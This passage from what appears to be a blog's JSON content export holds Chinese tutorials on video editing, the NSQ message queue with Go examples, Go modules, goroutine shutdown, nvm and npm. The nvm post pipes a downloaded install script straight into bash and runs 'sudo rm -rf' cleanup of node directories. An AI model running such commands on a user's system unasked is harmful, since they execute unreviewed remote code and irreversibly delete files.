转场\n\n+ 效果 -> 视频过渡 -> 拖动 -> 放在两个段中间\n+ 常用的是 交叉溶解\n\n##### 1.6 音效\n\n+ 点中音乐段, 左上角调节级别(控制音量, 负无穷到正无穷)\n+ 点击前面的小闹钟, 然后再K帧, 可以制作音量的变化\n\n##### 1.7 字幕\n\n+ 窗口 -> 字幕 -> 新建字幕\n\n##### 1.8 导出\n\n+ 文件 -> 导出 -> H.264(mp4格式)\n+ 通过调节比特率/最大比特率 可以降低文件的大小\n\n### 2. 快捷键\n\n+ v 选择\n+ c 剪刀\n+ m 标记\n+ ~ 全屏\n+ space 播放/暂停\n+ 左右箭头  手动走帧\n+ alt+鼠标滚轮  放大缩小序列\n+ del 删除\n\n### 3. 插件\n\n+ 磨皮插件 Digital Anarchy Beauty Box\n\n  + show mask\n\n  + 吸取低颜色和高颜色\n  + 调节第二个参数(skin detail amount?), 加大磨皮\n\n### 4. 遇到的问题\n\n+ Q: 音效帧无法控制\n\n  A: 把效果->级别上面的那个属性(Bypass/旁路)给关闭\n\n+ Q: 无法删除视频转场\n\n  A: 把视频段宽度降低或增大, 点击转场文字,删除\n\n### 5. 技巧\n\n+ 序列归类合并\n\n  1. 每个音频可以新建一个同名序列, 然后剪辑后形成新的序列\n\n  2. 最后新建一个序列, 把之前的序列都拖到过来\n\n  3. 如果视频比较大, 可以把步骤1的序列导出为视频, 再进行第二个步骤\n\n+ 剪辑收尾\n  1. 音效K帧变负无穷\n  2. 可以导出帧,形成一个png, 停留几秒\n\n### 6. 参考教程\n\n+ https://www.bilibili.com/video/av8703816/","tags":["photo"],"categories":["摄影"]},{"title":"nsq的介绍和使用","url":"%2Fp%2F17c769c4.html","content":"\n# 1. nsq 介绍\n\n[nsq](https://github.com/bitly/nsq)是一个基于Go语言的分布式实时消息平台，nsq可用于大规模系统中的实时消息服务，并且每天能够处理数亿级别的消息，其设计目标是为在分布式环境下运行的去中心化服务提供一个强大的基础架构。\n\n<!-- more -->\n\n### 1.1 nsq 的组成\n\nnsq是由四个重要组件构成：\n\n- [nsqd](http://bitly.github.io/nsq/components/nsqd.html)：一个负责接收、排队、转发消息到客户端的守护进程\n- [nsqlookupd](http://bitly.github.io/nsq/components/nsqlookupd.html)：管理拓扑信息并提供最终一致性的发现服务的守护进程\n- [nsqadmin](http://bitly.github.io/nsq/components/nsqadmin.html)：一套Web用户界面，可实时查看集群的统计数据和执行各种各样的管理任务\n- [utilities](http://nsq.io/components/utilities.html)：常见基础功能、数据流处理工具，如nsq_stat、nsq_tail、nsq_to_file、nsq_to_http、nsq_to_nsq、to_nsq\n\n### 1.2 nsq的主要特点\n\n- 具有分布式且无单点故障的拓扑结构 支持水平扩展，在无中断情况下能够无缝地添加集群节点\n- 低延迟的消息推送，参见官方提供的[性能说明文档](http://nsq.io/overview/performance.html)\n- 具有组合式的负载均衡和多播形式的消息路由\n- 既擅长处理面向流（高吞吐量）的工作负载，也擅长处理面向Job的（低吞吐量）工作负载\n- 消息数据既可以存储于内存中，也可以存储在磁盘中\n- 实现了生产者、消费者自动发现和消费者自动连接生产者，参见nsqlookupd\n- 支持安全传输层协议（TLS），从而确保了消息传递的安全性\n- 具有与数据格式无关的消息结构，支持JSON、Protocol Buffers、MsgPacek等消息格式\n- 非常易于部署（几乎没有依赖）和配置（所有参数都可以通过命令行进行配置）\n- 使用了简单的TCP协议且具有多种语言的客户端功能库\n- 具有用于信息统计、管理员操作和实现生产者等的HTTP接口\n- 为实时检测集成了统计数据收集器[StatsD](https://github.com/etsy/statsd/)\n- 具有强大的集群管理界面，参见nsqadmin\n\n\n\n# 2. nsq 组件\n\n### 2.1 nsqd (真正干活的)\n\n1. nsqd 是一个守护进程，负责接收，排队，投递消息给客户端\n2. 简单的说，真正干活的就是这个服务，它主要负责message的收发，队列的维护。nsqd会默认监听一个tcp端口(4150)和一个http端口(4151)以及一个可选的https端口\n3. nsqd 具有以下功能或特性\n\n* 对订阅了同一个topic，同一个channel的消费者使用负载均衡策略（不是轮询）\n* 只要channel存在，即使没有该channel的消费者，也会将生产者的message缓存到队列中（注意消息的过期处理）\n* 保证队列中的message至少会被消费一次，即使nsqd退出，也会将队列中的消息暂存磁盘上(结束进程等意外情况除外)\n* 限定内存占用，能够配置nsqd中每个channel队列在内存中缓存的message数量，一旦超出，message将被缓存到磁盘中\n* topic，channel一旦建立，将会一直存在，要及时在管理台或者用代码清除无效的topic和channel，避免资源的浪费\n\n\n\n### 2.2 nsqlookupd(中心管理服务)\n\n0. nsqlookupd是守护进程负责管理拓扑信息。客户端通过查询 nsqlookupd 来发现指定话题（topic）的生产者，并且 nsqd 节点广播话题（topic）和通道（channel）信息\n\n1. 简单的说nsqlookupd就是中心管理服务，它使用tcp(默认端口4160)管理nsqd服务，使用http(默认端口4161)管理nsqadmin服务。同时为客户端提供查询功能\n\n2. nsqlookupd具有以下功能或特性\n\n* 唯一性，在一个Nsq服务中只有一个nsqlookupd服务。当然也可以在集群中部署多个nsqlookupd，但它们之间是没有关联的\n* 去中心化，即使nsqlookupd崩溃，也会不影响正在运行的nsqd服务\n* 充当nsqd和naqadmin信息交互的中间件\n* 提供一个http查询服务，给客户端定时更新nsqd的地址目录 \n\n\n\n### 2.3 nsqadmin(展示数据)\n\n0. 是一套 WEB UI，用来汇集集群的实时统计，并执行不同的管理任务\n1. nsqadmin具有以下功能或特性\n    * 提供一个对topic和channel统一管理的操作界面以及各种实时监控数据的展示，界面设计的很简洁，操作也很简单\n    * 展示所有message的数量，恩....装X利器\n    * 能够在后台创建topic和channel，这个应该不常用到\n    * nsqadmin的所有功能都必须依赖于nsqlookupd，nsqadmin只是向nsqlookupd传递用户操作并展示来自nsqlookupd的数据\n\n\n\n# 3. nsq 操作\n\n### 3.1 安装和启动\n\n安装 nsq\n\n``` bash\nbrew install nsq \n```\n\n启动 nsqlookupd\n\n```bash\nnsqlookupd\n\n[nsqlookupd] 2020/07/14 13:10:26.005144 INFO: nsqlookupd v1.2.0 (built w/go1.13.5)\n[nsqlookupd] 2020/07/14 13:10:26.006620 INFO: HTTP: listening on [::]:4161 # 管理 nsqd\n[nsqlookupd] 2020/07/14 13:10:26.006620 INFO: TCP: listening on [::]:4160 # 管理 nsqadmin\n```\n\n启动 nsqd\n\n```bash\nnsqd --lookupd-tcp-address=127.0.0.1:4160 -broadcast-address=127.0.0.1\n\n[nsqd] 2020/07/14 13:11:55.889343 INFO: nsqd v1.2.0 (built w/go1.13.5)\n[nsqd] 2020/07/14 13:11:55.889519 INFO: ID: 24\n[nsqd] 2020/07/14 13:11:55.889954 INFO: NSQ: persisting topic/channel metadata to nsqd.dat\n[nsqd] 2020/07/14 13:11:55.909569 INFO: TCP: listening on [::]:4150 # tcp监听4150\n[nsqd] 2020/07/14 13:11:55.909673 INFO: HTTP: listening on [::]:4151 # http监听4151\n[nsqd] 2020/07/14 13:11:55.909858 INFO: LOOKUP(127.0.0.1:4160): adding peer\n[nsqd] 2020/07/14 13:11:55.909872 INFO: LOOKUP connecting to 127.0.0.1:4160\n[nsqd] 2020/07/14 13:11:55.914186 INFO: LOOKUPD(127.0.0.1:4160): peer info {TCPPort:4160 HTTPPort:4161 Version:1.2.0 BroadcastAddress:liuweideMacBook-Air.local}\n```\n\n启动 nsqadmin\n\n```bash\nnsqadmin --lookupd-http-address=127.0.0.1:4161\n\n[nsqadmin] 2020/07/14 13:13:39.580161 INFO: nsqadmin v1.2.0 (built w/go1.13.5)\n[nsqadmin] 2020/07/14 13:13:39.581124 INFO: HTTP: listening on [::]:4171 # 监听4171\n```\n\n### 3.2 操作\n\n+ 浏览器访问 http://127.0.0.1:4171/ 观察数据\n\n+ 发布一个消息 \n\n  ```bash\n  curl -d 'levonfly1' 'http://127.0.0.1:4151/pub?topic=test'\n  ```\n\n+ 创建一个消费者\n\n  ```bash\n  nsq_to_file --topic=test --output-dir=/tmp --lookupd-http-address=127.0.0.1:4161\n  ```\n  可以在/tmp/文件夹内看到输入的消息log\n\n  \n\n+ 再发布几个消息\n\n  ```bash\n  curl -d 'levonfly2' 'http://127.0.0.1:4151/pub?topic=test'\n  curl -d 'levonfly3' 'http://127.0.0.1:4151/pub?topic=test'\n  ```\n\n\n\n# 4. golang 使用 nsq\n\n### 4.1 生产者\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"time\"\n\n\tnsq \"github.com/nsqio/go-nsq\"\n)\n\nfunc main() {\n\tcfg := nsq.NewConfig()\n\t// 连接 nsqd 的 tcp 连接\n\tproducer, err := nsq.NewProducer(\"127.0.0.1:4150\", cfg)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// 发布消息\n\tvar count int\n\tfor {\n\t\tcount++\n\t\tbody := fmt.Sprintf(\"test %d\", count)\n\t\tif err := producer.Publish(\"test\", []byte(body)); err != nil {\n\t\t\tlog.Fatal(\"publish error: \" + err.Error())\n\t\t}\n\t\ttime.Sleep(1 * time.Second)\n\t}\n}\n```\n\n### 4.2 消费者\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\n\t\"github.com/nsqio/go-nsq\"\n)\n\nfunc main() {\n\tcfg := nsq.NewConfig()\n\tconsumer, err := nsq.NewConsumer(\"test\", \"levonfly\", cfg)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// 处理信息\n\tconsumer.AddHandler(nsq.HandlerFunc(func(message *nsq.Message) error {\n\t\tlog.Println(string(message.Body))\n\t\treturn nil\n\t}))\n\n\t// 连接 nsqd 的 tcp 连接\n\tif err := consumer.ConnectToNSQD(\"127.0.0.1:4150\"); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\t<-consumer.StopChan\n}\n```","tags":["nsq"],"categories":["消息队列"]},{"title":"golang_module包管理的使用","url":"%2Fp%2F6c6632b7.html","content":"\n\n\ngolang从诞生之初就一直有个被诟病的问题：缺少一个行之有效的“官方”包依赖管理工具。之前golang包管理工具有数十个， 说实话都不是让人非常满意。\n\ngo 1.11 有了对模块的实验性支持，大部分的子命令都知道如何处理一个模块，比如 run build install get list mod 子命令。go 1.12 会删除对 GOPATH 的支持，go get 命令也会变成只能获取模块，不能像现在这样直接获取一个裸包。\n\n\n\n\n\n可以用环境变量 GO111MODULE 开启或关闭模块支持，它有三个可选值：off、on、auto，默认值是 auto。\n\n- GO111MODULE=off 无模块支持，go 会从 GOPATH 和 vendor 文件夹寻找包。\n- GO111MODULE=on 模块支持，go 会忽略 GOPATH 和 vendor 文件夹，只根据 go.mod 下载依赖。\n- GO111MODULE=auto 在 $GOPATH/src 外面且根目录有 go.mod 文件时，开启模块支持。\n\n在使用模块的时候，GOPATH 是无意义的，不过它还是会把下载的依赖储存在 $GOPATH/pkg/mod 中，也会把 go install 的结果放在 $GOPATH/bin 中。\n\n<!-- more -->\n\n### 1. go mod 使用教程\n\nhttps://github.com/golang/go/wiki/Modules # 官方wiki, 基本所有的问题都能在这里找到\n\n\n\n##### 1.1 在使用前先确保golang升级到1.11:\n\nhttps://golang.org/dl/ #下载golang\n\n\n\n### 2. 使用go mod 实践\n\n\n\n##### 2.1. 快速开始：\n\n1. 把之前的工程拷贝到$GOPATH/src之外\n\n2. 在工程目录下执行：go mod init {module name}，该命令会创建一个go.mod文件\n\n3. 然后在该目录下执行 go build，就可以了，go.mod中记录了依赖包及其版本号。\n\n   \n\n##### 2.2. 在 go build 中 遇到了以下几个问题, 记录如下:\n\n\n\n2.2.1 golang.org的包竟然下不下来(你懂的)\n\n可以使用在go.mod里添加replace选项\n\n```go\nreplace (golang.org/x/text => github.com/golang/text v0.3.0 )\n```\n\n 也可以用代理的方式, 更加方便\n\n```shell\nexport GOPROXY=https://athens.azurefd.net\n```\n\n\n\n2.2.2 发现找不到包(包层级多的)\n\ncannot load github.com/aliyun/alibaba-cloud-sdk-go/sdk: cannot find module providing package github.com/aliyun/alibaba-cloud-sdk-go/sdk\n\n```shell\ngo get github.com/aliyun/alibaba-cloud-sdk-go@master  #带@master\n```\n\n\n\n2.2.3 在替换的时候还发现这个错误\n\ncannot call non-function xurls.Strict (type *regexp.Regexp)\n\n```shell\nmvdan.cc/xurls  #之前用的是这个版本,换成下面的就可以了\nmvdan.cc/xurls/v2\n```\n\n\n\n2.2.4  只有直接使用的依赖会被记录在`go.mod`文件中, 贴出go.mod的内容如下:\n\n```go\nmodule github.com/unix2dos/goods-notify\n\n\n\ngo 1.12\n\n\n\nrequire (\n\n\tgithub.com/PuerkitoBio/goquery v1.5.0\n\n\tgithub.com/aliyun/alibaba-cloud-sdk-go v0.0.0-20190528035818-94084c920892\n\n\tgithub.com/gorilla/websocket v1.4.0 // indirect\n\n\tgithub.com/joho/godotenv v1.3.0\n\n\tgithub.com/pkg/errors v0.8.1 // indirect\n\n\tgithub.com/stretchr/testify v1.3.0\n\n\tgithub.com/unix2dos/bearychat-go v0.0.0-20190222142113-d09d4a5e73e5\n\n\tgithub.com/valyala/fasthttp v1.3.0\n\n\tgithub.com/yunpian/yunpian-go-sdk v0.0.0-20171206021512-2193bf8a7459\n\n\tgolang.org/x/text v0.3.2\n\n\tmvdan.cc/xurls/v2 v2.0.0\n\n)\n```\n\n\n\n`indirect` 注释标记了依赖不是被当前模块直接使用的，只是在其他依赖项中被间接引用。\n\n\n\n2.2.5  go.sum文件介绍\n\n同时，`go.mod`和`go`命令维护了一个名叫`go.sum`的文件包含了指定模块版本的期望的[加密hash](https://golang.org/cmd/go/#hdr-Module_downloading_and_verification)：\n\n`go`命令使用`go.sum`文件保证之后的模块下载会下载到跟第一次下载相同的文件内容，保证你的项目依赖不会发生预期外的恶意修改、意外问题和其他问题。`go.mod` 和 `go.sum`都需要放进版本管理中。\n\n\n\n### 3. go mod 相关操作\n\n`go list -m all`  可以查看当前的依赖和版本(当前模块，或者叫做主模块，通常是第一行，接下来是根据依赖路径排序的依赖)。\n\n\n\n`go mod edit -fmt` 格式化 `go.mod` 文件。\n\n\n\n `go mod tidy` 从 `go.mod` 删除不需要的依赖、新增需要的依赖，这个操作不会改变依赖版本。\n\n\n\n##### 3.1 go get 命令\n\n获取依赖的特定版本，用来升级和降级依赖。可以自动修改 `go.mod` 文件，而且依赖的依赖版本号也可能会变。在 `go.mod` 中使用 `exclude` 排除的包，不能 `go get` 下来。\n\n\n\n与以前不同的是，新版 `go get` 可以在末尾加 `@` 符号，用来指定版本。\n\n它要求仓库必须用 `v1.2.0` 格式打 tag，像 `v1.2` 少个零都不行的，必须是[语义化](https://semver.org/lang/zh-CN/)的、带 `v` 前缀的版本号。\n\n\n\n```\ngo get github.com/gorilla/mux           # 匹配最新的一个 tag\ngo get github.com/gorilla/mux@latest    # 和上面一样\ngo get github.com/gorilla/mux@v1.6.2    # 匹配 v1.6.2\ngo get github.com/gorilla/mux@e3702bed2 # 匹配 v1.6.2\ngo get github.com/gorilla/mux@c856192   # 匹配 c85619274f5d\ngo get github.com/gorilla/mux@master    # 匹配 master 分支\n```\n\n\n\n`latest` 匹配最新的 tag。\n\n`v1.2.6` 完整版本的写法。\n\n`v1`、`v1.2` 匹配带这个前缀的最新版本，如果最新版是 `1.2.7`，它们会匹配 `1.2.7`。\n\n`c856192` 版本 hash 前缀、分支名、无语义化的标签，在 `go.mod` 里都会会使用约定写法 `v0.0.0-20180517173623-c85619274f5d`，也被称作伪版本。\n\n`go get` 可以模糊匹配版本号，但 `go.mod` 文件只体现完整的版本号，即 `v1.2.0`、`v0.0.0-20180517173623-c85619274f5d`，只不过不需要手写这么长的版本号，用 `go get` 或上文的 `go mod edit -require` 模糊匹配即可，它会把匹配到的完整版本号写进 `go.mod`  文件。\n\n\n\n\n\n参考资料:\n\nhttps://github.com/golang/go/wiki/Modules\n\nhttps://www.jianshu.com/p/c5733da150c6\n\nhttps://www.4async.com/2019/03/using-go-modules/","tags":["golang"],"categories":["4_golang实战"]},{"title":"golang优雅的等待或通知goroutine退出","url":"%2Fp%2Faca47db0.html","content":"\n# 1. 等待goroutine退出\n\n### 1.1 通过Channel传递退出信号\n\nGo的一大设计哲学就是：通过Channel共享数据，而不是通过共享内存共享数据。主流程可以通过channel向任何goroutine发送停止信号，就像下面这样：\n\n\n\n这种方式可以实现优雅地停止goroutine，但是当goroutine特别多的时候，这种方式不管在代码美观上还是管理上都显得笨拙不堪。\n\n```\npackage main\n\nimport (\n   \"fmt\"\n   \"time\"\n)\n\nfunc run(done chan int) {\n   for {\n      select {\n      case <-done:\n         fmt.Println(\"exiting...\")\n         done <- 1\n         break\n      default:\n      }\n\n      time.Sleep(time.Second * 1)\n      fmt.Println(\"do something\")\n   }\n}\n\nfunc main() {\n   c := make(chan int)\n\n   go run(c)\n\n   fmt.Println(\"wait\")\n   time.Sleep(time.Second * 5)\n\n   c <- 1\n   <-c\n\n   fmt.Println(\"main exited\")\n}\n```\n\n<!-- more -->\n\n### 1.2 使用Waitgroup\n\n通常情况下，我们像下面这样使用waitgroup:\n\n1. 创建一个Waitgroup的实例，假设此处我们叫它wg\n2. 在每个goroutine启动的时候，调用wg.Add(1)，这个操作可以在goroutine启动之前调用，也可以在goroutine里面调用。当然，也可以在创建n个goroutine前调用wg.Add(n)\n3. 当每个goroutine完成任务后，调用wg.Done()\n4. 在等待所有goroutine的地方调用wg.Wait()，它在所有执行了wg.Add(1)的goroutine都调用完wg.Done()前阻塞，当所有goroutine都调用完wg.Done()之后它会返回。\n\n那么，如果我们的goroutine是一匹不知疲倦的牛，一直孜孜不倦地工作的话，如何在主流程中告知并等待它退出呢？像下面这样做：\n\n\n\n```\npackage main\n\nimport (\n   \"fmt\"\n   \"os\"\n   \"os/signal\"\n   \"sync\"\n   \"syscall\"\n)\n\ntype Service struct {\n   // Other things\n\n   ch        chan bool\n   waitGroup *sync.WaitGroup\n}\n\nfunc NewService() *Service {\n   s := &Service{\n      // Init Other things\n      ch:        make(chan bool),\n      waitGroup: &sync.WaitGroup{},\n   }\n\n   return s\n}\n\nfunc (s *Service) Stop() {\n   close(s.ch)\n   s.waitGroup.Wait()\n}\n\nfunc (s *Service) Serve() {\n   s.waitGroup.Add(1)\n   defer s.waitGroup.Done()\n\n   for {\n      select {\n      case <-s.ch:\n         fmt.Println(\"stopping...\")\n         return\n      default:\n      }\n      s.waitGroup.Add(1)\n      go s.anotherServer()\n   }\n}\nfunc (s *Service) anotherServer() {\n   defer s.waitGroup.Done()\n   for {\n      select {\n      case <-s.ch:\n         fmt.Println(\"stopping...\")\n         return\n      default:\n      }\n\n      // Do something\n   }\n}\n\nfunc main() {\n\n   service := NewService()\n   go service.Serve()\n\n   // Handle SIGINT and SIGTERM.\n   ch := make(chan os.Signal)\n   signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)\n   fmt.Println(<-ch)\n\n   // Stop the service gracefully.\n   service.Stop()\n}\n```\n\n\n\n# 2. 通知 goroutine 退出\n\n\n\n有时候我们需要通知goroutine停止它正在干的事情，比如一个正在执行计算的web服务，然而它的客户端已经断开了和服务端的连接。\n\nGo语言并没有提供在一个goroutine中终止另一个goroutine的方法，由于这样会导致goroutine之间的共享变量落在未定义的状态上。\n\n在rocket launch程序中，我们往名字叫abort的channel里发送了一个简单的值，在countdown的goroutine中会把这个值理解为自己的退出信号。但是如果我们想要退出两个或者任意多个goroutine怎么办呢？\n\n\n\n一种可能的手段是向abort的channel里发送和goroutine数目一样多的事件来退出它们。如果这些goroutine中已经有一些自己退出了，那么会导致我们的channel里的事件数比goroutine还多，这样导致我们的发送直接被阻塞。另一方面，如果这些goroutine又生成了其它的goroutine，我们的channel里的数目又太少了，所以有些goroutine可能会无法接收到退出消息。一般情况下我们是很难知道在某一个时刻具体有多少个goroutine在运行着的。\n\n\n\n另外，当一个goroutine从abort channel中接收到一个值的时候，他会消费掉这个值，这样其它的goroutine就没法看到这条信息。为了能够达到我们退出goroutine的目的，我们需要更靠谱的策略，来通过一个channel把消息广播出去，这样goroutine们能够看到这条事件消息，并且在事件完成之后，可以知道这件事已经发生过了。\n\n\n\n回忆一下我们关闭了一个channel并且被消费掉了所有已发送的值，操作channel之后的代码可以立即被执行，并且会产生零值。我们可以将这个机制扩展一下，来作为我们的广播机制：**不要向channel发送值，而是用关闭一个channel来进行广播。**\n\n\n\n\n\n# 3. 控制 goroutine 退出\n\n通常`Goroutine`会因为两种情况阻塞：\n\n1. IO操作，比如对`Socket`的`Read`。\n2. `channel`操作。对一个chan的读写都有可能阻塞`Goroutine`。\n\n\n\n对于情况1，只需要关闭对应的描述符，阻塞的`Goroutine`自然会被唤醒。\n\n重点讨论情况2。并发编程，`Goroutine`提供一种`channel`机制，`channel`类似管道，写入者向里面写入数据，读取者从中读取数据。如果`channel`里面没有数据，读取者将阻塞，直到有数据；如果`channel`里面数据满了，写入者将因为无法继续写入数据而阻塞。\n\n如果在整个应用程序的生命周期里，writer和reader都表现为一个`Goroutine`，始终都在工作，那么如何在应用程序结束前，通知它们终止呢？在Go中，并不推荐像abort线程那样，强行的终止`Goroutine`。因此，抽象的说，必然需要保留一个入口，能够跟writer或reader通信，以告知它们终止。\n\n \n\n\n\n我们先看reader。我们首先可以想到，利用`close`函数关闭正在读取的`channel`，从而可以唤醒reader，并退出。但是考虑到`close`并不能很好的处理writer（因为writer试图写入一个已经close的channel，将引发异常）。因此，我们需要设计一个额外的只读`channel`用于通知：\n\n```\ntype routineSignal struct {\n    done <-chan struct{}\n}\n```\n\n `routineSignal`的实例，应当通过外部生成并传递给reader，例如：\n\n```\nfunc (r *reader)init(s *routineSignal) {\n    r.signal = s\n}\n```\n\n 在reader的循环中，就可以这么写：\n\n```\nfunc (r *reader)loop() {\n    for {\n        select {\n        case <-r.signal.done:\n            return\n        case <-r.queue:\n            ....\n        }\n    }\n}\n```\n\n当需要终止`Goroutine`的时候只需要关闭这个额外的`channel`：\n\n```\nclose(signal.done)\n```\n\n \n\n\n\n看起来很完备了，这可以处理大部分的情况了。这样做有个弊端，尽管，我们可以期望`close`唤醒`Goroutine`进而退出，但是并不能知道`Goroutine`什么时候完成退出，因为`Goroutine`可能在退出前还有一些善后工作，这个时候我们需要`sync.WaitGroup`。改造一下`routineSignal`：\n\n\n\n```\ntype routineSignal struct {\n    done chan struct{}\n    wg   sync.WaitGroup\n}\n```\n\n\n\n增加一个sync.WaitGroup的实例，在`Goroutine`开始工作时，对wg加1，在`Goroutine`退出前，对wg减1：\n\n```\nfunc (r *reader)loop() {\n    r.signal.wg.Add(1)\n    defer r.signal.wg.Done()\n    for {\n        select {\n        case <-r.signal.done:\n            return\n        case <-r.queue:\n            ....\n        }\n    }\n}\n```\n\n 外部，只需要等待`WaitGroup`返回即可：\n\n```\nclose(signal.done)\nsignal.wg.Wait()\n```\n\n只要`Wait()`返回就能断定`Goroutine`结束了。\n\n\n\n推导一下，不难发现，对于writer也可以采用这种方法。于是，总结一下，我们创建了一个叫`routineSignal`的结构，结构里面包含一个`chan`用来通知`Goroutine`结束，包含一个`WaitGroup`用于`Goroutine`通知外部完成善后。这样，通过这个结构的实例优雅的终止`Goroutine`，而且还可以确保`Goroutine`终止成功。 ","tags":["golang"],"categories":["1_golang基础"]},{"title":"node版本管理nvm的安装和使用","url":"%2Fp%2Fdf22a20c.html","content":"\n\n\n我们可能同时在进行2个项目，而2个不同的项目所使用的node版本又是不一样的，或者是要用更新的node版本进行试验和学习。这种情况下，对于维护多个版本的node将会是一件非常麻烦的事情，而nvm就是为解决这个问题而产生的，他可以方便的在同一台设备上进行多个node版本之间切换，而这个正是nvm的价值所在。\n\n\n\n### 1. nodejs，npm，nvm之间的区别\n\n+ nodejs：在项目开发时的所需要的代码库\n\n+ npm：nodejs 包管理工具。在安装的 nodejs 的时候，npm 也会跟着一起安装，它是包管理工具。npm 管理 nodejs 中的第三方插件\n\n+ nvm：nodejs 版本管理工具。也就是说：一个 nvm 可以管理很多 node 版本和 npm 版本。\n\n\n\n<!-- more -->\n\n### 2. nvm的安装:\n\n如果在安装nvm之前就安装了node, 那么最好在安装之前清理下全局的node环境.\n\n```shell\nnpm ls -g --depth=0 # 查看已经安装在全局的模块，以便删除这些全局模块后再按照不同的 node 版本重新进行全局安装\n\nsudo rm -rf /usr/local/lib/node_modules # 删除全局 node_modules 目录\n\nsudo rm -rf ~/.npm/ # 删除模块缓存目录\n\nsudo rm /usr/local/bin/node # 删除 node\n\ncd  /usr/local/bin && ls -l | grep \"../lib/node_modules/\" | awk '{print $9}'| xargs rm # 删除全局 node 模块注册的软链\n```\n\n\n\n安装: https://github.com/nvm-sh/nvm\n\n```shell\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash\n```\n\n重新打开一个终端输入 `nvm`即可\n\n\n\n### 3. nvm常用指令\n\n```shell\nnvm version #查看当前的版本\n\nnvm ls-remote #列出所有可安装的版本\n\nnvm install <version> #安装指定的版本，如nvm install v8.14.0\n\nnvm uninstall <version> #卸载指定的版本\n\nnvm ls #列出所有已经安装的版本\n\nnvm use <version> #切换使用指定的版本\n\nnvm current #显示当前使用的版本\n\nnvm alias default <version> #设置默认node版本\n\n```\n\n\n\n#### 3.1 安装最新稳定版 node\n\n```shell\nnvm install stable  \n```\n\n\n\n#### 3.2 node被安装在哪里了呢?\n\n在终端我们可以使用which node来查看我们的node被安装到了哪里，这里终端打印出来的地址其实是你当前使用的node版本快捷方式的地址。\n\n```\n$ which node\n/Users/liuwei/.nvm/versions/node/v12.2.0/bin/node\n\n\n$ which npm\n/Users/liuwei/.nvm/versions/node/v12.2.0/bin/npm\n```\n\n\n\n### 4. nvm 和 n  的区别\n\n在 node 的版本管理工具中，nvm 自然声名远扬，然而我们也不能忘了来自 TJ 的 n。这两种，是目前最主流的方案。\n\n关于这两个工具如何安装和使用，这里不再赘言，请见它们各自的主页：\n\n- [creationix/nvm](https://github.com/creationix/nvm)\n- [tj/n](https://github.com/tj/n)\n\n接下来我们着重关注一下 nvm 和 n 的运作机制和特性。\n\n#### 4.1 n\n\nn 是一个需要全局安装的 npm package。\n\n```shell\nnpm install -g n\n```\n\n\n这意味着，我们在使用 n 管理 node 版本前，首先需要一个 node 环境。我们或者用 Homebrew 来安装一个 node，或者从官网下载 pkg 来安装，总之我们得先自己装一个 node —— n 本身是没法给你装的。\n\n然后我们可以使用 n 来安装不同版本的 node。\n\n在安装的时候，n 会先将指定版本的 node 存储下来，然后将其复制到我们熟知的路径/usr/local/bin，非常简单明了。当然由于 n 会操作到非用户目录，所以需要加 sudo 来执行命令。\n\n所以这样看来，n 在其实现上是一个非常易理解的方案。\n\n\n\n#### 4.2 nvm\n\n我们再来看 nvm。不同于 n，nvm 不是一个 npm package，而是一个独立软件包。这意味着我们需要单独使用它的安装逻辑：\n\n```shell\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash(zsh)# 注意后面的bash环境\n```\n\n\n\n然后我们可以使用 nvm 来安装不同版本的 node。\n\n在安装的时候，nvm 将不同的 node 版本存储到 ~/.nvm/<version>/ 下，然后修改$PATH，将指定版本的 node 路径加入，这样我们调用的 node 命令即是使用指定版本的 node。\n\nnvm 显然比 n 要复杂一些，但是另一方面，由于它是一个独立软件包，因此它和 node 之间的关系看上去更合乎逻辑：nvm 不依赖 node 环境，是 node 依赖 nvm；而不像 n 那样产生类似循环依赖的问题。\n\n","tags":["nodejs"],"categories":["nodejs"]},{"title":"nodejs的模块安装和package.json","url":"%2Fp%2Fd100a0c2.html","content":"\n\n\n### 1. npm 介绍\n\n[npm](https://www.npmjs.com/package/npm) 是 Node 的模块管理器，功能极其强大。它是 Node 获得成功的重要原因之一。\n\nnpm不需要单独安装。在安装Node的时候，会连带一起安装npm。但是，Node附带的npm可能不是最新版本，最好用下面的命令，更新到最新版本。\n\n```shell\nnpm install npm@latest -g \n```\n\n上面的命令中，@latest表示最新版本，-g表示全局安装。所以，命令的主干是npm install npm，也就是使用npm安装自己。之所以可以这样，是因为npm本身与Node的其他模块没有区别。\n\n<!-- more -->\n\n\n\n### 2. npm 安装\n\n#### 2.1 npm install \n\n[npm install](https://docs.npmjs.com/cli/install) 命令用来安装模块到node_modules目录。\n\n```shell\n $ npm install <packageName> \n```\n\n\n\n安装之前，npm install会先检查，node_modules目录之中是否已经存在指定模块。如果存在，就不再重新安装了，即使远程仓库已经有了一个新版本，也是如此。\n\n如果你希望，一个模块不管是否安装过，npm 都要强制重新安装，可以使用-f或--force参数。\n\n```shell\n $ npm install <packageName> --force\n```\n\n\n\n#### 2.2 npm update\n\n如果想更新已安装模块，就要用到[npm update](https://docs.npmjs.com/cli/update)命令。\n\n```shell\n $ npm update <packageName> \n```\n\n它会先到远程仓库查询最新版本，然后查询本地版本。如果本地版本不存在，或者远程版本较新，就会安装。\n\n\n\n#### 2.3 registry\n\nnpm update命令怎么知道每个模块的最新版本呢？\n\n答案是 npm 模块仓库提供了一个查询服务，叫做 registry 。以 npmjs.org 为例，它的查询服务网址是 https://registry.npmjs.org/ 。\n\n这个网址后面跟上模块名，就会得到一个 JSON 对象，里面是该模块所有版本的信息。比如，访问 <https://registry.npmjs.org/react>，就会看到 react 模块所有版本的信息。\n\n它跟下面命令的效果是一样的。\n\n```shell\n $ npm view react  \n```\n\n\n\nregistry 网址的模块名后面，还可以跟上版本号或者标签，用来查询某个具体版本的信息。比如， 访问 https://registry.npmjs.org/react/v0.14.6 ，就可以看到 React 的 0.14.6 版。\n\n返回的 JSON 对象里面，有一个dist.tarball属性，是该版本压缩包的网址。\n\n```json\ndist: {   \n\tshasum: '2a57c2cf8747b483759ad8de0fa47fb0c5cf5c6a',   \n\ttarball: 'http://registry.npmjs.org/react/-/react-0.14.6.tgz'  \n},\n```\n\n\n\n到这个网址下载压缩包，在本地解压，就得到了模块的源码。`npm install`和`npm 